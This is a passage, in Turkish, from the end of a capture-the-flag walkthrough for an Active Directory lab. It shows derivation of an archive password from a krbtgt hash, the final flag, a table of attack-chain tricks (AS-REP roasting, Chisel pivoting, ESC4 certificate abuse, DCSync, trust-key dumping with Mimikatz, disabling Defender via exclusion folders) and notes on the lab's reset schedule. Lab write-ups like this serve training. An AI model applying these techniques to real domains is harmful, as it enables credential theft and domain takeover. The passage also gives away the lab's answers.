# pw = hashlib.sha256(bytes.fromhex(KRBTGT_HASH) + b"SKYDAYS2026").hexdigest()
```

```bash
# Kali'de Python ile şifreyi türet
python3 -c "
import hashlib
krbtgt = bytes.fromhex('e82fe4003879cc304f982ff9f450b05c')
pw = hashlib.sha256(krbtgt + b'SKYDAYS2026').hexdigest()
print('Arsiv sifresi:', pw)
"

# Arsiv sifresi: 1ed9b02294c38adff9c31afc7ab0c53ac61142e366fe7eda51b989a1ebcf3001
```

### 10.10 FLAG 5

```powershell
cd C:\Backup

# Arşivi çıkart
& "C:\Program Files\7-Zip\7z.exe" e SKYDAYS_BACKUP_2026.7z `
    -p1ed9b02294c38adff9c31afc7ab0c53ac61142e366fe7eda51b989a1ebcf3001

# Flag'i oku
type root.txt
# SKYDAYS{g0ld3n_t1ck3t_s1d_f1lt3r_bdc01_pwn3d}
```

---

## Tricks & Tuzaklar — Tam Özet

| # | Adım | Trick / Tuzak | Çözüm |
|---|------|---------------|-------|
| 1 | LDAP | `e.beylik` standart sorguda görünmez | `helpdesk` base64 creds → SystemAccounts OU |
| 2 | LDAP | helpdesk info alanı base64 encoded | `base64 -d` ile çöz → `H3lpd3sk!2024` |
| 3 | AS-REP | `userAccountControl: 4194304` ne anlama gelir? | `DONT_REQUIRE_PREAUTH` = AS-REP Roast yapılabilir |
| 4 | a.demirelli | NTLM çalışmıyor, Evil-WinRM bağlanmıyor | Protected Users → Kerberos TGT + `-r SKYDAYS.CTF` |
| 5 | a.demirelli | WinRM dışarıdan kabul etmiyor | localhost kısıtı → Chisel pivot gerekli |
| 6 | Chisel | Defender siliyor | `C:\HR_Sandbox` AV exclusion klasörü |
| 7 | svc_backup | AddSelf çalıştı ama WinRM erişilemiyor | Restore script 3dk'da sıfırlar → Hızlı hareket et! |
| 8 | ESC4 | BloodHound'da görünmüyor | `certipy-ad find` ile `gmsa_svc$` olarak tara |
| 9 | ESC4 | Flag değiştirdim ama sertifika reddediliyor | CA 60sn cache → **65sn bekle** |
| 10 | ESC4 | `certipy-ad auth` çalışmıyor | PKINIT kapalı → LDAPS + DCSync pivot |
| 11 | Trust | BACKUP$ hash ile ticket çalışmıyor | BACKUP$ hash ≠ trust key → `lsadump::trust /patch` |
| 12 | BDC01 | evil-winrm `Invalid token` hatası | `rdns = false` → krb5.conf'a ekle |
| 13 | BDC01 | `KRB5CCNAME` çakışıyor | `unset KRB5CCNAME` → `-K` ile mutlak path ver |
| 14 | BDC01 | `KRB_AP_ERR_SKEW` hatası | Saat farkı → `faketime` kullan |
| 15 | BDC01 LSA | Mimikatz Defender tarafından engelleniyor | `C:\Backup\Tools` AV exclusion + Defender kapat |

---

## Restore & Cleanup Notları

| Makine | Script | Süre | Sıfırlanan Şeyler |
|--------|--------|------|-------------------|
| DC01 | `CTF-AD-Restore` | Her 3 dakika | AD yapısı, şifreler, ADCS template, flagler, LDAP |
| DC01 | `CTF-Cleanup` | Her 30 dakika | HR_Sandbox, Windows\Temp |
| BDC01 | `BDC01-Cleanup` | Her 30 dakika | Backup\Tools, Defender reset, NTP kapalı |

> **Önemli Uyarılar:**
> - `svc_backup`'ı gruba ekledikten sonra **3 dakikan var** — WinRM hemen bağlan
> - ESC4 template flag değiştirince 65sn bekle, sonra sertifika iste — toplamda 3 dakika içinde kal
> - Chisel, mimikatz ve diğer araçları her zaman exclusion klasörlerine yükle
> - BDC01'e direkt IP erişimi yoktur — Chisel pivot her zaman gereklidir
